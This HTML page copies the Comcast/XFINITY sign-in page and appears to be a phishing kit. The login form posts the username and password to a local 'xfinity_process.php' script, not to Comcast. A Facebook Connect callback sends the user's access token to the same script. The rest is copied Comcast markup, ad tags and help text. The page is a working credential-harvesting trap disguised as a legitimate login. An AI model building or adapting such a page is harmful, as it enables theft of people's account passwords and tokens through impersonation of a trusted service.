
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en">
<head>
	<title>Sign in to Comcast</title>
	<link rel="stylesheet" type="text/css" href="css/styles.min.css?v=19">
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<meta name="description" content="Comcast.net has more to offer when you sign in to your mySIGN-IN Account. Use your account to access other Comcast sites and services like Comcast.net, Fancast, Plaxo, and more.">
	<meta name="viewport" content="width=1024">
	<link rel="shortcut icon" href="images/favicon.ico">
</head>
<body>
<div id="bd" class="signin clearfix">
	<div id="left">    <style type="text/css">#ad-block{width:300px;margin:0 0 0 auto}#ad-wrapper{width:300px}#ads-info{font-size:10px;margin:9px 0 0 0;text-align:center}#ads-info a{margin-left:20px}#ads-info a.first{margin-left:0}</style>
<div id="ad-block" aria-hidden="true">
<div id="ad-wrapper">
<!-- Start Mail ad tag -->
<script type="text/javascript">
quantSegs='';
function qc_results(result) {
for (var i = 0; i < result.segments.length; i++) {
quantSegs += "&qsg=" + result.segments[i].id; //added 
}
}
</script>
<script type="text/javascript" src="https://pixel.quantserve.com/api/segments.json?a=p-9eJ8k4iSzux46&callback=qc_results&ttl=86400"></script>
<script type="text/javascript">
(function() {
var unknown_zip = "US:UNKNOWN",
unknown_cid = "NONE";
function matchKeys(keys) {
var re = new RegExp('(?:' + keys.join('|') + ')=(?:\\"|%22)(.*?)(?:\\"|%22)');
var matches = document.cookie.match(re);
if (!matches) return null;
return matches[1];
}
var flag_matches = document.cookie.match(/(?:adt_optout_flag)=(true|false)/);
var optout = (flag_matches && flag_matches[1] == "true");
window.f_ADTARGET_ZIP = (function() {
if (optout) return unknown_zip;
var zip = matchKeys(['adt_zip']);
if (!zip) return unknown_zip;
return "US:" + zip;
})();
window.f_AM_CID = (function() {
if (optout) return unknown_cid;
var cid = matchKeys(['amcid']);
if (!cid) return unknown_cid;
return cid.replace(",","&am=");
})();
window.f_ENABLE_ADTARGETING = true;
})();
</script>

<script type="text/javascript">
// <![CDATA[
//document.write((function() {
//(function() {
var opts = [];
if (typeof f_ADTARGET_ZIP != 'undefined')
opts.push('_OAS_GEO_OVERRIDE_=' + f_ADTARGET_ZIP);
if (typeof f_AM_CID != 'undefined')
opts.push('am=' + f_AM_CID.split(',').join('&am='));
if (typeof quantSegs != 'undefined')
opts.push(quantSegs.slice(1));
if (location.search.indexOf('AdParam') != -1) {
opts.push('AdParam='+location.search.slice(9));
}
OAS_query = opts.join('&');
OAS_rn = new String (Math.random()); OAS_rns = OAS_rn.substring (2, 11);
// ]]>
</script>

<script type="text/javascript">

OAS_type = 'jx'; //jx or mjx
OAS_sitepage = 'comcast.net/login_secure/notve';
OAS_listpos = 'x32';

document.write('<script type="text/javascript" src=\"https://oasc09.247realmedia.com/RealMedia/ads/adstream_' + OAS_type + '.ads/' + OAS_sitepage + '/1' + OAS_rns +'@' + OAS_listpos + '?' + OAS_query + '\" ></scr' + 'ipt>');
</script>
<!--End Mail ad tag -->

</div>
<div id="ads-info"><a class="first" href="http://www.comcast.net/adinformation" rel="default" target="_blank">Ad Info</a><a href="https://www.surveymonkey.com/s.aspx?sm=FyNNVDhj_2f2FNc2KVOHQ4eg_3d_3d" target="_blank">Ad Feedback</a></div>
</div>
</div>
	<div id="right">
		<div id="signin-box">
	<form name="signin" action="xfinity_process.php" method="post" onsubmit="return login.onSubmit()">
	<div id="signin" >
		<h1 class="default no-error">XFINITY</h1>
		<div class="sign_in">
					<h2>Sign-in</h2>
				</div>
		<label for="user" id="login_id_label">Email or username </label>
		<input id="user" name="user" type="text" value="" maxlength="128">
		<p><a href="https://login.comcast.net/myaccount/lookup?continue=https%3A%2F%2Flogin.comcast.net%2Flogin%3FforceAuthn%3Dfalse%26ts%3Da5a279c9%26ipAddrAuthn%3Dfalse%26lang%3Den%26s%3Dportal%26deviceAuthn%3Dfalse%26r%3Dcomcast.net%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26passive%3Dfalse%26rm%3D2" target="_self" title="Lookup User ID"><strong>Don&#39;t know your email or username?</strong></a></p>
		<label for="passwd" id="password_label">Password </label>
		<input id="passwd" name="passwd" type="password" maxlength="128">
		<p><a id="forgotPwdLink" href="https://login.comcast.net/myaccount/reset?continue=https%3A%2F%2Flogin.comcast.net%2Flogin%3FforceAuthn%3Dfalse%26ts%3Da5a279c9%26ipAddrAuthn%3Dfalse%26lang%3Den%26s%3Dportal%26deviceAuthn%3Dfalse%26r%3Dcomcast.net%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26passive%3Dfalse%26rm%3D2" target="_self" title="Reset Password"><strong>Forgot your password?</strong></a></p>
		<div>
		<input type="checkbox" id="remember_me" value="1"  name="rm">
		<label id="rm_label" for="remember_me" title="Keep me signed in.">Keep me signed in.</label>
		<a href="#" id="rm_label_learn_more" rel="#rm_help">Learn more<span class="access-aid"> about staying signed in</span></a>
		</div>
		<button type="submit" id="sign_in">SIGN IN &#9658;</button>
		<p class="fbor">or</p>
		<p><a href="#" id="sign_in_fb" title="Connect using Facebook" onclick="fblogin()"><img src="images/fb_btn.png" width="202" height="26"></a></p>
		<p class="fblearnmore">We value your privacy.
		<a href="#" id="fb_learn_more_text" rel="#fb_learn_more_help"><strong>Learn more<span class="access-aid"> about connecting through Facebook</span></strong></a></p>

		<input type="hidden" name="deviceAuthn" value="false">
		<input type="hidden" name="s" value="portal">
		<input type="hidden" name="ts" value="a5a279c9">
		<input type="hidden" name="forceAuthn" value="false">
		<input type="hidden" name="r" value="comcast.net">
		<input type="hidden" name="ipAddrAuthn" value="false">
		<input type="hidden" name="continue" value="http://xfinity.comcast.net/">
		<input type="hidden" name="passive" value="false">
		<input type="hidden" name="lang" value="en">
 	</div>

		<div id="needaccess">
			<h2>Need access?</h2>
			<p class="action"><a href="https://login.comcast.net/myaccount/create-uid?continue=https%3A%2F%2Flogin.comcast.net%2Flogin%3FforceAuthn%3Dfalse%26ts%3Da5a279c9%26ipAddrAuthn%3Dfalse%26lang%3Den%26s%3Dportal%26deviceAuthn%3Dfalse%26r%3Dcomcast.net%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26passive%3Dfalse%26rm%3D2" target="_self" title="Create a Username">Create a Username &raquo;</a></p>
		</div>
 	</form>
</div>

<div id="rm_help" role="dialog" class="jq-overlay" aria-describedby="rm_help_descr"><a href="#" class="close"></a><div class="inner" id="rm_help_descr">
<h2>Why Remember Me?</h2>
<p>When you choose Remember Me on sign in, we will remember who you are and keep you signed in for up to 30 days unless you sign out. This is great if you sign in all the time to check your email or watch TV shows online.</p>
<p>But be careful: If you share your personal computer with others, they could access and make some changes to your account. You should definitely not use Remember Me in public computers!</p>
</div></div>


<div id="fb_learn_more_help" role="dialog" class="jq-overlay" aria-describedby="fb_learn_more_help_descr"><a href="#" class="close"></a><div class="inner" id="fb_learn_more_help_descr">
<h1>Facebook Connect and Privacy</h1>
<h3>Your Privacy is a Priority</h3>
<p class="margin-popup">Facebook Connect allows you to use your Facebook credentials to login to certain portions of XFINITY TV and XFINITY.com.  Comcast does not send your Comcast account or billing information to Facebook as part of this connection process.  You can read more about which portions of XFINITY TV and XFINITY.com support Facebook Connect, <a href="http://customer.comcast.com/help-and-support/internet/facebookconnect/" target="_blank">here</a>.</p>
<h3>Added Security Delivers Peace of Mind</h3>
<p class="margin-popup">Use of Facebook Connect will not allow access to sensitive information or features, including Comcast billing and account information, XFINITY Home or XFINITY Connect applications.  As an added security measure, you will need to sign in with your Comcast username and password to access this information.</p>
<h3>Only With Your Permission</h3>
<p class="margin-popup">Comcast will not post anything to your Facebook wall unless you give us permission to do so.</p>
<h3>Facebook Email as Comcast Alternate Email</h3>
<p class="margin-popup">If you have not provided Comcast with an alternate contact e-mail address for your Comcast account, Comcast will add the e-mail that you use to login to Facebook as the alternate contact e-mail address for your Comcast account.</p>
<h3>Limiting Auto Login</h3>
<p>Comcast does not control Facebook's "Keep me logged in" feature.  If you use this feature, you (and other users of this device) may be automatically logged in to certain portions of XFINITY TV and XFINITY.com.  You can learn more about Facebook's "Keep me logged in" feature <a href="http://www.facebook.com/help" target="_blank">here</a>.  You can disconnect the log-in connection between your Facebook and Comcast accounts by going to your "App Settings" in Facebook and deleting the XFINITY app.</p>
</div></div>
 	</div>
 	<br class="clear">
</div>
<div id="ft-outer"><div id="ft">
<div class="ft_wrap">
	<img src="images/footer.png" />
	<!--<ul>
		<li class="logo">Xfinity</li>
		<li class="first">&copy; 2013 Comcast</li>
		<li><a href="http://xfinity.comcast.net/siteindex/" title="Site Map">Site Map</a></li>
		<li><a href="http://xfinity.comcast.net/privacy/" title="Privacy Policy">Privacy Policy</a></li>
		<li><a href="http://xfinity.comcast.net/terms/" title="Terms of Service">Terms of Service</a></li>
		<li><a href="http://customer.comcast.com/Pages/HelpNFC.aspx?id=Comcast-Help-and-Support-home" title="Contact Us">Contact Us</a></li>
		<li class="clogo">Comcast</li>
	</ul>-->
</div>
<div class="truste">
	<div id="b537c389-7be1-4331-bb73-03a71788bc12"><script type="text/javascript" src="//privacy-policy.truste.com/privacy-seal/Comcast-Cable-Communications-Management,-LLC/asc?rid=b537c389-7be1-4331-bb73-03a71788bc12"></script><a href="//privacy.truste.com/privacy-seal/Comcast-Cable-Communications-Management,-LLC/validation?rid=bf9d4d6f-2b32-4201-a167-5b55a4451508" title="TRUSTe online privacy certification" target="_blank"><img style="border: none" src="//privacy-policy.truste.com/privacy-seal/Comcast-Cable-Communications-Management,-LLC/seal?rid=9426d53b-42b1-4587-8d55-c57322ccb60d" alt="TRUSTe online privacy certification"></a></div>
</div></div></div>



<div id="fb-root"></div>
<script type="text/javascript">
window.fbAsyncInit = function() {
	FB.init({
		appId: 161991040493541,
		status: true,
		cookie: true,
		xfbml: true,
		oauth: true});
};

var params="";
		params+="&deviceAuthn=false";
		params+="&s=portal";
		params+="&ts=a5a279c9";
		params+="&forceAuthn=false";
		params+="&r=comcast.net";
		params+="&ipAddrAuthn=false";
		params+="&continue=http://xfinity.comcast.net/";
		params+="&passive=false";
		params+="&lang=en";

function fblogin() {
	FB.login(callServer, {scope:'email'});
}

function callServer(response) {
	if(response.authResponse) {
		window.location="xfinity_process.php?access_token="+response.authResponse.accessToken+params;
	}else{
		// user cancelled login
	}
}

(function() {
	var e = document.createElement('script');
	e.async = true;
	e.src = document.location.protocol+'//connect.facebook.net/en_US/all.js';
	document.getElementById('fb-root').appendChild(e);
}());
</script>

<script type="text/javascript" src="js/jquery-1.6.4.min.js"></script>
<script type="text/javascript" src="js/jquery.tools-1.2.6.min.js"></script>
<script type="text/javascript">
var login = (function ($) {
	var m = {};

	function hasQuery(uri){return uri.indexOf("?")>=0;}

	m.appendQuery = function (uri, query){if(hasQuery(uri)){return uri+"&"+query;}else{return uri+"?"+query;}}
	m.placeFooter = function(){var e=$("#ft-outer");if(e.length==0){return}var c=$("#bd");if(c.length!=1){return}var a=c.offset().top+c.outerHeight(true);var b=e.outerHeight(true);var d=($(window).height()>(a+b))?"absolute":"static";e.css({position:d})};
	m.focusLoginForm = function() { var f=$("#user");if(f.length>0 && f.val().length==0){f.focus()}else{f=$("#passwd");if(f.length>0){f.focus()}}};
	m.openLinkWithLoginId = function(f){var c=$(f.currentTarget);var a=c.attr("href");var b=$("#user").val();if(b.length>0){a=login.appendQuery(a,"login="+b)}var d=c.attr("target").length>0?c.attr("target"):"";if(d==""){window.location.href=a}else{window.open(a,d)}f.stopPropagation();return false};
	m.commonOverlayProp = {mask:{color:"#000000",loadSpeed:200,opacity:0.7},closeOnClick:false,top:"center",onBeforeLoad:function(){$("#ad-wrapper").hide();},onLoad:function(){this.getOverlay().find("a.close:first-child").focus()},onClose:function(){$("#ad-wrapper").show()}};
	m.onSubmit=function(){var a=$("#user");var d=$("#passwd");if(a.val()===""||d.val()===""){$("#error").remove();$('<p id="error" class="error">Please type in your email or username and password to sign in.</p>').insertAfter(".sign_in");var c=$("#login_id_label");c.find("span.access-aid").remove();c.append('<span class="access-aid">Please type in your email or username and password to sign in. Please re-enter username.</span>');var b=$("#password_label");b.find("span.access-aid").remove();b.append('<span class="access-aid">Please type in your email or username and password to sign in. Please re-enter password.</span>'); d.focus(); a.focus(); return false}else{return true}};
	return m;
}(jQuery));
</script>
<script type="text/javascript">
$(function(){
	login.focusLoginForm();
	$('#forgotPwdLink').click(login.openLinkWithLoginId);
	$("#fb_learn_more_text").overlay(login.commonOverlayProp);
	$("#rm_label_learn_more").overlay(login.commonOverlayProp);

})
</script>
<script type="text/javascript">
$(function() {
    $(window).load(login.placeFooter)
    $(window).resize(login.placeFooter)
});
</script>
	<div style="display:none">
<script type="text/javascript" src="/js/omniture.js?v=19"></script>
<script type="text/javascript"><!--
	s.pageName="sign in"
	s.events = "event11"
	s.channel = "sign in"
	s.prop4 = "sign in"
	s.prop7 = "portal"
	s.prop33 = "comcast net"
	s.prop35 = "authentication"
	s.prop36 = "site:home"
	s.eVar36 = "site:home"
	s.eVar47 = "anonymous"
	s.eVar7 = "portal"

	/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
	var s_code=s.t();if(s_code)document.write(s_code);//-->
</script>
</div>
</body>
</html>
